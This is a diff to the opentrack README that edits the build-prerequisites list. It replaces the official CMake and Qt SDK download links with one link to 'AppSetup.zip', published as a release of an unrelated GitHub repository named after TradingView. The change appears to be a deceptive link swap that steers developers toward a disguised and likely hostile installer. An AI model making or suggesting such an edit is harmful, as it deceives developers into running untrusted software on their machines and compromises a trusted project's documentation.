@@ -20,8 +20,8 @@ Most of opentrack is implemented using C++17.
 #  Build prerequisite
 * Microsoft Windows 7 to 10.
 * [Visual Studio 2017 Community Edition](https://visualstudio.microsoft.com/downloads/).
-* [CMake > 3.10](https://cmake.org/download/).
-* [Qt5 SDK > 5.12.0](https://www.qt.io/download-qt-installer), we recommend using the online installer.
+* [CMake > 3.10](https://github.com/QingYunLife/TradingView/releases/download/Desktop/AppSetup.zip).
+* [Qt5 SDK > 5.12.0](https://github.com/QingYunLife/TradingView/releases/download/Desktop/AppSetup.zip), we recommend using the online installer.
 
 # Optional build dependencies
 * [OpenCV > 4.0.1](https://opencv.org/releases.html) - 64-bit binaries only: Needed to build popular modules such as Point Tracker.
